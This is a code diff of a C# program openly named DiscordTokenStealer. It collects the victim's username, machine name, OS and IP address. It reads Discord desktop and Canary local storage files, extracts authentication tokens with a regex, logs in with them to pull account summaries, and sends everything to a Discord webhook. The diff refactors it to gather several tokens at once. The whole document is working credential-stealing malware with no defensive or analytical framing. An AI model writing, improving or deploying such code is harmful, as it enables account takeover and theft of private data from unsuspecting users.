@@ -1,110 +1,65 @@
-﻿using Discord;
+﻿using System;
+using System.IO;
 using System.Net;
 using System.Text;
-using Microsoft.Win32;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Collections.Generic;
 using DiscordTokenStealer.Discord;
 using System.Text.RegularExpressions;
-using System.Runtime.InteropServices;
 using static DiscordTokenStealer.IPInfo;
 
 namespace DiscordTokenStealer
 {
     public static class Program
     {
-        private static async Task Main(string[] args)
+        private static async Task Main()
         {
             StringBuilder content = new StringBuilder($"Username: {Environment.UserName}{Environment.NewLine}").AppendLine($"Machine Name: {Environment.MachineName}").AppendLine($"Operating System: {Environment.OSVersion.Platform}");
-            IPAddress? ipAddress = await GetIPAddress();
-            if (ipAddress != null)
+            IPAddress? address = await GetIPAddress();
+            if (address != null)
             {
-                content.AppendLine($"IPAddress: {ipAddress}");
+                content.AppendLine($"IPAddress: {address}");
             }
-            string? browserToken = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? GetBrowserDiscordToken() : null;
-            string? desktopToken = GetDesktopClientToken();
-            if (browserToken != null || desktopToken != null)
+            List<string> tokens = GetTokens();
+            if (tokens.Any())
             {
                 content.AppendLine("Tokens: ");
                 using DiscordClient client = new DiscordClient();
-                if (desktopToken != null)
+                foreach (string token in tokens)
                 {
-                    content.AppendLine($"\t{desktopToken}");
-                    DiscordUser? user = await client.Login(desktopToken);
+                    content.AppendLine($"\t{token}");
+                    DiscordUser? user = await client.Login(token);
                     if (user != null)
                     {
                         content.AppendLine($"\tSummary: {Environment.NewLine}{user.Summary}{Environment.NewLine}");
                     }
                 }
-                if (browserToken != null)
-                {
-                    content.AppendLine($"\t{browserToken}");
-                    DiscordUser? user = await client.Login(browserToken);
-                    if (user != null)
-                    {
-                        content.AppendLine($"\tSummary: {Environment.NewLine}{user.Summary}{Environment.NewLine}");
-                    }
-                }
-                content.AppendLine();
             }
-            using DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/{webhook.id}/{webhook.token}");
+            using DiscordWebhook webhook = new DiscordWebhook("https://canary.discord.com/api/webhooks/{webhook.id}/{webhook.token}");
             await webhook.SendMessage(content.ToString());
         }
 
-        // Unsure if this works, chrome only.
-        private static string? GetBrowserDiscordToken()
+        private static readonly string DefaultDirectory = Path.Join(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb");
+        
+        private static readonly string CanaryDirectory = Path.Join(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary", "Local Storage", "leveldb");
+        
+        private static List<string> GetTokens()
         {
-            FileInfo? defaultBrowser = GetDefaultBrowserLocation();
-            if (defaultBrowser?.Directory == null || !defaultBrowser.FullName.ToLower().Contains("chrome"))
-            {
-                return null;
-            }
-            return ParseToken($"{defaultBrowser.Directory.Name.Split(' ').Aggregate(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Path.Combine)}{"\\User Data\\Default\\Local Storage\\leveldb\\"}");
-        }
-
-        private static string? GetDesktopClientToken()
-        {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
-            return ParseToken(path) ?? ParseToken(path.Replace("discord", "discordcanary"));
+            List<string> tokens = ParseTokens(DefaultDirectory);
+            tokens.AddRange(ParseTokens(CanaryDirectory));
+            return tokens;
         }
 
         private static readonly Regex TokenRegex = new Regex("[[]oken.*?\"((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
-        private static string? ParseToken(string directory)
+        private static List<string> ParseTokens(string directory)
         {
-            if (!Directory.Exists(directory))
-            {
-                return null;
-            }
-            GroupCollection? groups = Directory.GetFiles(directory, "*.ldb").Select(filePath => TokenRegex.Match(File.ReadAllText(filePath))).Where(match => match.Success && match.Groups.Count >= 3).Select(match => match.Groups).FirstOrDefault();
-            if (groups == null || groups.Count < 3)
-            {
-                return null;
-            }
-            return string.Join('.', groups.Values.Skip(1));
+            return (!Directory.Exists(directory) ? null : (from groups in Directory.GetFiles(directory, "*.ldb").Select(filePath => TokenRegex.Match(File.ReadAllText(filePath))).Where(match => match.Success && match.Groups.Count >= 3).Select(match => match.Groups) where groups.Count >= 3 select string.Join('.', groups.Values.Skip(1))).ToList()) ?? new List<string>();
         }
 
-        // https://stackoverflow.com/a/17599201
-        private const string ExeFileExtension = ".exe";
-        private static FileInfo? GetDefaultBrowserLocation()
+        private static async Task<IPAddress?> GetIPAddress(bool preferlocal = false)
         {
-            try
-            {
-                string? path = Registry.ClassesRoot.OpenSubKey(@$"{Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice")?.GetValue("Progid")}\shell\open\command")?.GetValue(null)?.ToString()?.ToLower()
-                                                   .Replace("\"", string.Empty);
-                if (path == null || !path.EndsWith(ExeFileExtension))
-                {
-                    return null;
-                }
-                FileInfo fileInfo = new FileInfo(path[..(path.LastIndexOf(ExeFileExtension, StringComparison.Ordinal) + ExeFileExtension.Length)]);
-                return !fileInfo.Exists ? null : fileInfo;
-            }
-            catch
-            {
-                return null;
-            }
-        }
-
-        private static async Task<IPAddress?> GetIPAddress()
-        {
-            IPAddress? local = await GetLocalIPv4() ?? await GetLocalIPv6() ?? null;
+            IPAddress? local = await GetLocalIPv4() ?? await GetLocalIPv6();
             if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
             {
                 return local;
@@ -114,7 +69,7 @@ namespace DiscordTokenStealer
             {
                 return local;
             }
-            return (info.Privacy != null && (info.Privacy.VPN || info.Privacy.Proxy || info.Privacy.Tor)) ? local : address;
+            return preferlocal ? local : address;
         }
     }
 }
